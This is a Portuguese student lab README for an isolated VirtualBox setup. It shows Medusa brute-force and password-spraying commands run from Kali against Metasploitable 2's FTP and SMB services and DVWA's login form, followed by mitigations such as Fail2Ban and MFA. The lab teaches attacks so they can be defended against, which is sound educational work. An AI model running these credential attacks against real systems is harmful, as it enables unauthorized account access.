# Cybersecurity-Brute-Force-com-Medusa-Kali-LinuxCenário do Projeto
O laboratório foi montado utilizando virtualização para garantir um ambiente isolado e seguro (Sandboxing).

Atacante: Kali Linux (IP: 192.168.56.101)

Alvo: Metasploitable 2 (IP: 192.168.56.102)

Ferramenta Principal: Medusa (Login Brute-force Tool)

Rede: Host-Only (VirtualBox)

Execução dos Testes
1. Ataque ao Serviço FTP (Porta 21)
O FTP é frequentemente alvo de ataques devido à transmissão de dados em texto claro.

Comando utilizado:

Bash
medusa -h 192.168.56.102 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
Resultado esperado: Identificação da senha do usuário msfadmin.

2. Password Spraying no SMB
Técnica utilizada para evitar o bloqueio de contas ao testar uma senha comum contra vários usuários.

Comando utilizado:

Bash
medusa -h 192.168.56.102 -U users.txt -p "password" -M smbnt
3. Brute Force Web (DVWA)
Simulação de ataque contra o formulário de login da aplicação Damn Vulnerable Web Application.

Comando base:

Bash
medusa -h 192.168.56.102 -u admin -P wordlist.txt -M http -m DIR:/dvwa/vulnerabilities/brute/
Análise de Vulnerabilidades e Mitigação
Durante os testes, as seguintes falhas foram exploradas:

Senhas Fracas: Uso de credenciais padrão ou presentes em dicionários comuns.

Ausência de Rate Limiting: O serviço permitiu centenas de tentativas sem bloquear o IP atacante.

Protocolos Inseguros: Serviços como FTP e Telnet não criptografam a autenticação.

Recomendações de Segurança:
Implementação de Políticas de Senha: Exigir complexidade (letras, números e símbolos).

Fail2Ban: Configurar o bloqueio automático de IPs após 3 ou 5 tentativas falhas.

MFA (Multifator): Essencial para impedir acessos mesmo com a senha correta.

Desativação de Serviços Desnecessários: Manter apenas portas essenciais abertas no Firewall.

Tecnologias Utilizadas
Kali Linux (Pentesting OS)

Metasploitable 2 (Vulnerable Lab)

Medusa (Password Cracking)

Nmap (Reconhecimento)

Aviso Legal: Este projeto tem fins estritamente educativos. O uso dessas técnicas em sistemas sem autorização prévia é ilegal.

👨‍💻 Autor
Desenvolvido por [Mauricio G Eckstein] para a trilha de Segurança da Informação da DIO.
